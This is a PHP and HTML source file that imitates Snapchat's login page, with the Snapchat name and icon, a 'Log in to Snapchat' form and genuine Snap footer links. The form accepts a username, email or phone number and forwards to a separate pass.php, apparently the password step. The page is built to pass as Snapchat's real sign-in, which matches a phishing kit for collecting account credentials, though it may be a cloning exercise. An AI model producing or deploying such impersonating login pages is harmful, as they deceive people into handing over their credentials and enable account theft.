<?php
    session_start();
    $uid= $empty_err= $uid_err="";
    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["login_id"]))
        {
            $empty_err="The input field below cannot be empty.";
        }
        else
        {
            $uid=htmlspecialchars($_POST["login_id"]);
            if(filter_var($uid,FILTER_VALIDATE_EMAIL) or (preg_match("/^[0-9]{10}+$/", $uid)))
            {
                header("Refresh:0; url=pass.php");
                exit();
            }
            else
            {
                $uid_err="Invalid Input.";
            }
        }
    }
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="login.css">
    <title>Accounts Snapchat</title>
</head>

<body>
    <div class="container">
        <img src="snapchat_icon.png" alt="Snapchat">
        <h3>Log in to Snapchat</h3>

        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>"  method="post">
            
            <label for="login_id">Username or Email or Phone number</label><br>
            <input type="text" name="login_id">
            <div class="error"><?php echo $uid_err, $empty_err; ?></div>
            <button type="submit">Next</button>
        </form>
    </div>

    <p class="sign_up">New To Snapchat? <a href="https://www.snapchat.com/download">Sign Up</a></p>

    <div class="container_bottom">
        <div class="col">
            <p>Company</p>
            <a href="https://snap.com/en-US">Snap Inc.</a><br>
            <a href="https://careers.snap.com/">Careers</a><br>
            <a href="https://newsroom.snap.com/">News</a>
        </div>
        <div class="col">
            <p>Community</p>
            <a href="https://help.snapchat.com/hc/en-us?utm_campaign=ap&utm_medium=snap&utm_source=web">Support</a><br>
            <a href="https://values.snap.com/privacy/transparency/community-guidelines">Community Guidelines</a><br>
            <a href="https://values.snap.com/safety/safety-center">Safety Center</a>
        </div>
        <div class="col">
            <p>Advertising</p>
            <a
                href="https://forbusiness.snapchat.com/?utm_source=accounts_snapchat_com&utm_medium=referral&utm_campaign=internal_referral&utm_content=footer_link">Buy
                Ads</a><br>
            <a href="https://snap.com/en-US/ad-policies"> Advertising Policies</a><br>
            <a href="https://snap.com/en-US/political-ads">Political Ads Library</a><br>
            <a href="https://snap.com/en-US/brand-guidelines">Brand Guidelines</a><br>
            <a
                href="https://help.snapchat.com/hc/en-us/articles/7047502545044-Promotions-Rules?utm_campaign=ap&utm_medium=snap&utm_source=web">Promotions
                Rules</a>
        </div>
        <div class="col"> 
            <p>Legal</p>
            <a href="https://values.snap.com/privacy/privacy-center">Privacy Center</a><br>
            <a
                href="https://help.snapchat.com/hc/en-us/articles/11399265637012-Your-Privacy-Choices-on-Snapchat?utm_campaign=privacy_choices&utm_medium=global_footer&utm_source=snapchat_com">Your
                Privacy Choices</a>
            <a href="https://snap.com/en-US/cookie-policy">Cookie Policy</a><br>
            <a
                href="https://help.snapchat.com/hc/en-us/articles/7012332110996-About-Reporting-Infringement-on-Snapchat?utm_campaign=ap&utm_medium=snap&utm_source=web">Report
                Infringement</a><br>
            <a href="https://snap.com/en-US/terms/custom-creative-tools">Custom Creative Tools Terms</a><br>
            <a href="https://www.snap.com/en-US/terms/create-geofilter">Community Geofilter Terms</a><br>
            <a href="https://snap.com/en-US/terms/lens-studio-license-agreement">Lens Studio Terms</a>
        </div>
    </div>

    <div class="end">
        <a href="https://values.snap.com/privacy/privacy-policy">Privacy Policy</a>
        <a href="https://snap.com/en-US/terms">Terms of Service</a>
    </div>

</body>

</html>